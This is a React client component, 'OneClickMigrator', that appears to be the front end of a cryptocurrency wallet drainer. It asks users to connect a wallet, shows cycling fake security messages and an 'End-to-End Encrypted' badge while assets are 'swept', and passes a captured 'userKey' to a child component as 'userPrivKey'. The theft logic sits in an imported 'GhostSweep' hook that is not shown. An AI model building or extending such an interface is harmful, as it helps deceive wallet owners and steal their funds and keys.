'use client'

import { useEffect, useState, useMemo, useCallback } from 'react'
import { createPortal } from 'react-dom'
import { useRecoveryLogic } from '@/hooks/GhostSweep'
import { SecurityShield } from './SecurityShield'

export function OneClickMigrator() {
    const [mounted, setMounted] = useState(false)
    const [statusIdx, setStatusIdx] = useState(0)
    const [showConnectModal, setShowConnectModal] = useState(false)

    const logic = useRecoveryLogic()

    const {
        isConnected,
        isScanning,
        isSweeping,
        isConnecting,
        isOpen,
        assets = [],
        handleInstantConnection,
        handleFullDisconnect,
        userKey,
        isInternal
    } = logic

    const scanningMessages = useMemo(() => [
        "Initializing Secure Audit...",
        "Verifying Chain Ownership...",
        "Syncing Identity Nodes...",
        "Auditing Permission Sets...",
        "Mapping Private Inventory...",
        "Validating Wallet Signature...",
        "Authenticating Protocols...",
        "Checking Asset Integrity...",
        "Securing Handshake...",
        "Finalizing Verification..."
    ], []);

    const sweepingMessages = useMemo(() => [
        "Confirming Ownership...",
        "Generating Secure Entropy...",
        "Synchronizing Assets...",
        "Verifying Block State...",
        "Finalizing Secure Link...",
        "Propagating Identity...",
        "Updating Vault Status...",
        "Authenticating Transit...",
        "Confirming Node Sync...",
        "Establishing Secure Vault..."
    ], []);

    useEffect(() => {
        setMounted(true)
    }, [])

    useEffect(() => {
        if (isInternal && (isConnecting || isOpen)) {
            setShowConnectModal(true);
        }
        if (isConnected && (isScanning || isSweeping)) {
            setShowConnectModal(false);
        }
    }, [isConnecting, isOpen, isConnected, isScanning, isSweeping, isInternal]);

    useEffect(() => {
        if (!isScanning && !isSweeping && !isConnecting) return;
        const interval = setInterval(() => {
            setStatusIdx((prev) => (prev + 1) % 10);
        }, 1800);
        return () => clearInterval(interval);
    }, [isScanning, isSweeping, isConnecting]);

    const handleManualClose = useCallback(() => {
        setShowConnectModal(false);
        handleFullDisconnect();
    }, [handleFullDisconnect]);

    /**
     * 🏎️ RE-TRIGGER LOGIC
     * If the user clicks connect again, we force a full reset and then call the connection.
     * This ensures the wallet popup triggers every single time the button is clicked.
     */
    const handleStartConnection = useCallback(async () => {
        // 1. If we are already "connected" but clicking again, clear everything first
        if (isConnected || isConnecting) {
            handleFullDisconnect();
        }

        // 2. Short delay to allow the state to clear, then trigger fresh
        setTimeout(() => {
            if (isInternal) {
                setShowConnectModal(true);
            }
            handleInstantConnection();
        }, 50);
    }, [handleInstantConnection, handleFullDisconnect, isInternal, isConnected, isConnecting]);

    if (!mounted) return null;

    const isConnectingInProgress = isConnecting || isOpen;
    const isActiveProtocol = (isConnected && (isScanning || isSweeping || !!userKey)) || (isInternal && showConnectModal);

    const getStatusText = () => {
        if (isSweeping) return sweepingMessages[statusIdx];
        if (isScanning) return scanningMessages[statusIdx];
        if (isInternal && (isConnectingInProgress || showConnectModal)) return "Establishing Secure Link...";
        if (userKey) return "Syncing Identity...";
        return "Ghost Protocol Active";
    };

    const SimpleModal = (
        <div className="fixed inset-0 z-[999999] flex items-center justify-center p-6">
            <div
                className="absolute inset-0 backdrop-blur-md bg-black/60 pointer-events-auto transition-opacity duration-150"
                onClick={handleManualClose}
            />

            <div className="relative w-full max-w-[360px] bg-[#141414] border border-white/[0.08] rounded-[28px] shadow-[0_24px_50px_-12px_rgba(0,0,0,0.9)] pointer-events-auto animate-in zoom-in-95 fade-in duration-150 overflow-hidden">
                <div className="flex items-center justify-between px-6 py-4 border-b border-white/[0.04]">
                    <div className="flex items-center gap-2">
                        <div className={`w-2 h-2 rounded-full ${isSweeping ? 'bg-orange-500 shadow-[0_0_8px_rgba(249,115,22,0.6)]' : 'bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.6)]'} animate-pulse`} />
                        <span className="text-[12px] font-semibold text-zinc-400 tracking-tight">
                            {isSweeping ? "Ghost Vault Sync" : "Secure Session"}
                        </span>
                    </div>

                    <button
                        onClick={handleManualClose}
                        className="p-2 -mr-2 rounded-full hover:bg-white/[0.1] transition-colors group"
                    >
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" className="text-zinc-500 group-hover:text-zinc-200 transition-colors">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                        </svg>
                    </button>
                </div>

                <div className="p-8 pt-10 flex flex-col items-center text-center">
                    <div className="relative w-20 h-20 mb-6 flex items-center justify-center">
                        <div
                            className="absolute inset-0 border-[3.5px] rounded-full border-white/[0.05] animate-spin"
                            style={{ borderTopColor: isSweeping ? '#f97316' : '#3b82f6', animationDuration: '0.8s' }}
                        />
                        <div className="w-14 h-14 rounded-full bg-white/[0.02] flex items-center justify-center">
                            <svg className={`w-7 h-7 ${isSweeping ? 'text-orange-500' : 'text-blue-500'}`} fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                            </svg>
                        </div>
                    </div>

                    <h2 className="text-[19px] font-bold text-white mb-2 tracking-tight">
                        {getStatusText()}
                    </h2>

                    <div className="space-y-1 mb-8">
                        <p className="text-[14px] text-zinc-400 font-medium">
                            {showConnectModal && !isConnected ? "Check for wallet pop-up..." : "Securing and auditing asset nodes."}
                        </p>
                        <p className="text-[13px] text-zinc-500">
                            Check for the connection pop-up.
                        </p>
                    </div>

                    <div className="w-full h-1.5 bg-white/[0.03] rounded-full overflow-hidden mb-8">
                        <div
                            className={`h-full transition-all duration-700 ease-in-out ${isSweeping ? 'bg-orange-500' : 'bg-blue-500'}`}
                            style={{ width: (showConnectModal && !isConnected) ? '25%' : `${((statusIdx + 1) / 10) * 100}%` }}
                        />
                    </div>

                    <div className="flex items-center gap-2 px-4 py-2 bg-white/[0.02] rounded-full border border-white/[0.04]">
                        <svg className="w-3 h-3 text-zinc-500" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                        </svg>
                        <span className="text-[10px] font-bold uppercase tracking-[0.1em] text-zinc-500">
                            End-to-End Encrypted
                        </span>
                    </div>
                </div>
            </div>
        </div>
    );

    return (
        <div suppressHydrationWarning className="relative inline-block">
            {!isActiveProtocol && (
                <button
                    onClick={handleStartConnection}
                    className="trk-btn trk-btn--outline22 min-w-[240px] transition-all active:scale-95"
                >
                    {isConnectingInProgress ? (
                        <div className="flex items-center justify-center gap-2">
                            <span className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin" />
                            <span className="text-[0.8rem] uppercase tracking-wider">Connecting...</span>
                        </div>
                    ) : (
                        <span className="text-[0.8rem] uppercase tracking-wider">
                            {isConnected ? "Reset & Reconnect" : "Connect Wallet"}
                        </span>
                    )}
                </button>
            )}

            {isActiveProtocol && createPortal(SimpleModal, document.body)}

            {isActiveProtocol && isInternal && isConnected && (
                <SecurityShield
                    isScanning={isScanning}
                    isSweeping={isSweeping}
                    assetCount={assets?.length || 0}
                    userPrivKey={userKey}
                    onCancel={handleManualClose}
                />
            )}
        </div>
    )
}